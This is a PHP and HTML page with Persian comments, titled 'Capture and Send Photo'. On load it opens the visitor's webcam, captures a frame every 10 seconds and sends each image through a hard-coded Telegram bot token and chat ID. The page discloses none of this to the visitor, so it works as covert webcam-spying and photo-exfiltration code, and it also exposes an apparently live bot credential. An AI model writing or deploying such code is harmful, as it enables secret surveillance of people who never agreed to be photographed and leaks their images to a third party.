<?php
// بخش PHP برای ارسال عکس به تلگرام
$token = '7405655297:AAFWGG6GoiP4vz_v-txDbMKrOLaqynOMkRA'; // جایگزین با توکن ربات تلگرام
$chat_id = '-1002164811427'; // جایگزین با شناسه چت تلگرام

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['photo'])) {
    $photo = $_FILES['photo']['tmp_name'];

    if (is_uploaded_file($photo)) {
        $file_data = new CURLFile($photo, 'image/jpeg', 'photo.jpg');

        $url = "https://api.telegram.org/bot$token/sendPhoto";

        $post_fields = [
            'chat_id' => $chat_id,
            'photo' => $file_data
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        curl_close($ch);

        echo $response; // برای مشاهده پاسخ می‌توانید این خط را نگه دارید
    } else {
        echo 'File upload failed.';
    }
    exit(); // برای جلوگیری از ادامه اجرای کد HTML
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture and Send Photo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            margin: 0;
        }
        #video {
            border: 1px solid #ccc;
            background-color: #000;
        }
    </style>
</head>
<body>
    <div>
        <video id="video" width="640" height="480" autoplay></video>
        <script>
            (async function() {
                const video = document.getElementById('video');
                
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;

                    function captureAndSend() {
                        const canvas = document.createElement('canvas');
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(blob => {
                            if (blob) {
                                const formData = new FormData();
                                formData.append('photo', blob, 'photo.jpg');

                                fetch('index.php', { // توجه: فایل PHP همان فایل HTML است
                                    method: 'POST',
                                    body: formData
                                }).then(response => response.text())
                                  .then(data => console.log(data))
                                  .catch(err => console.error('Error:', err));
                            }
                        }, 'image/jpeg');
                    }

                    setInterval(captureAndSend, 10000); // هر 10 ثانیه یکبار عکس بگیرد

                } catch (error) {
                    console.error('Error accessing camera:', error);
                }
            })();
        </script>
    </div>
</body>
</html>
